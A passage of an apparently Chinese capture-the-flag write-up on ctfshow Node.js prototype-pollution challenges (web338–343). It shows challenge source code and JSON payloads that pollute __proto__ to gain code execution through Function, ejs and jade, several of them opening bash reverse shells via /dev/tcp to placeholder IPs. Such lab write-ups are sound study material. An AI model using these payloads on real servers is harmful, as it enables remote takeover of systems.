class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>其中还require了一个utils/common</strong></p><p>然后就去查看一下，<strong>发现common.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">copy</span>:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>顺便在看的时候发现common.js和P神里面举例的JS可以说是一模一样</p><p>只要secert.ctfshow===’36dboy’就会打印出flag。考点是<strong>原型链污染</strong>，第一次接触</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils.copy(user,req.body);,这里就是突破口，通过给Object添加ctfshow的属性，使 if(secert.ctfshow===&#x27;36dboy&#x27;)返回ture即可</span><br></pre></td></tr></table></figure><p>因为comment.js代码就是nodejs污染</p><p><strong>payload</strong></p><p><img src="../images/image-20230130230002185.png" alt="image-20230130230002185"></p><h2 id="web339-模板渲染rce-原型链污染"><a href="#web339-模板渲染rce-原型链污染" class="headerlink" title="web339(模板渲染rce 原型链污染)"></a>web339(模板渲染rce 原型链污染)</h2><p>题目</p><p><img src="../images/image-20230131203939821.png" alt="image-20230131203939821"></p><p><strong>原型链污染都是依靠修改object下的参数进行污染，而创建的对象要想达到object这个对象的话，得使用proto</strong></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">username</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">password</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalUser</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">user</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这想要是<code>secert.ctfshow===flag</code>是不可能的事，那我们就只能想别的办法</p><p>这里给的源文件多出一个api.js</p><p><strong>api.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这里的话是在function函数中的模板渲染，也是可以同过原型链污染query进行模板渲染的rce</p><p>这个render函数实际上是渲染函数，会在出现特定请求的时候执行特定操作</p><p>经过测试，query参数的值是可以直接当做语句来执行的</p><p>先/login那里污染一下发包，然后再post访问一下/api即可。</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/[vps-ip]/[port] 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>payload中不用require的原因是这个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</span><br></pre></td></tr></table></figure><p>这里的话得在服务器的防火墙那添加监听端口，不然会监听不成功。</p><p><img src="../images/image-20230201184758003.png" alt="image-20230201184758003"></p><p>如果监听的是9999端口，就新开一个9999端口。</p><p><strong>第一步，新监听一个端口</strong></p><p><img src="../images/image-20230201184938137.png" alt="image-20230201184938137"></p><p><strong>第二步**</strong>(反弹shell)**</p><p>先/login那里污染一下发包，然后再post访问一下/api即可。</p><p><img src="../images/image-20230201185729072.png" alt="image-20230201185729072"></p><p>文中标记的地方要记得修改</p><p><img src="../images/image-20230201185805509.png" alt="image-20230201185805509"></p><p><img src="../images/image-20230201185855177.png" alt="image-20230201185855177"></p><p>监听端口出现这就代表成功了，这里访问api的原因是，因为在/logion里object类里修改了query的值，然后触发点在/api的代码里。</p><p><strong>解法二</strong></p><p>是利用ejs的模板引擎漏洞</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>解法步骤和上面一样，是先污染/login，然后在访问api</p><h2 id="web340-两层污染"><a href="#web340-两层污染" class="headerlink" title="web340(两层污染)"></a>web340(两层污染)</h2><p>题目</p><p><img src="../images/image-20230201190842269.png" alt="image-20230201190842269"></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>api.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230201191036822.png" alt="image-20230201191036822"></p><p>就是这里的不一样，这里想要修改isAdmin的值的话，得转到object，因经过测试，<code>userinfo.__proto__.__proto__` 才是 `Object</code> 对象。</p><p><img src="../images/image-20230201191809798.png" alt="image-20230201191809798"></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.11/11111 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>解法和上一题一样，先污染/login,然后在访问/api</p><h2 id="web341-两层污染加ejs"><a href="#web341-两层污染加ejs" class="headerlink" title="web341(两层污染加ejs)"></a>web341(两层污染加ejs)</h2><p>题目</p><p><img src="../images/image-20230201193633584.png" alt="image-20230201193633584"></p><p>这题和其他不同的是没有 <code>/api</code> 接口触发污染点了，所以使用 <code>ejs</code> RCE。</p><p>然后像 web340 一样污染要套两层。下面 EXP 也服务器监听端口是 <code>9999</code></p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>这就是为什么要污染两层的原因</p><p><strong>index.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话，render触发由<strong>api.js</strong>改到了<strong>index.js</strong></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.111/11111 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>先去污染/login，然后再去抓index.js的包，触发render</p><p><img src="../images/image-20230201205016149.png" alt="image-20230201205016149"></p><h2 id="web342-jade模板渲染"><a href="#web342-jade模板渲染" class="headerlink" title="web342(jade模板渲染)"></a>web342(jade模板渲染)</h2><p>题目</p><p><img src="../images/image-20230201205558380.png" alt="image-20230201205558380"></p><p><strong>index.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123;<span class="attr">title</span>:<span class="string">&#x27;ctfshow&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);  </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题难度太大，看着wp都看不懂，直接拿payload打就行了</p><p><a href="https://tari.moe/2021/05/04/ctfshow-nodejs/">别的师傅写的超详细wp</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>方法和ejs渲染一样</p><h2 id="web343-jade模板渲染-加了过滤"><a href="#web343-jade模板渲染-加了过滤" class="headerlink" title="web343(jade模板渲染  加了过滤)"></a>web343(jade模板渲染  加了过滤)</h2><p>题目</p><p><img src="../images/image-20230201211333400.png" alt="image-20230201211333400"></p><p>源码</p><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span 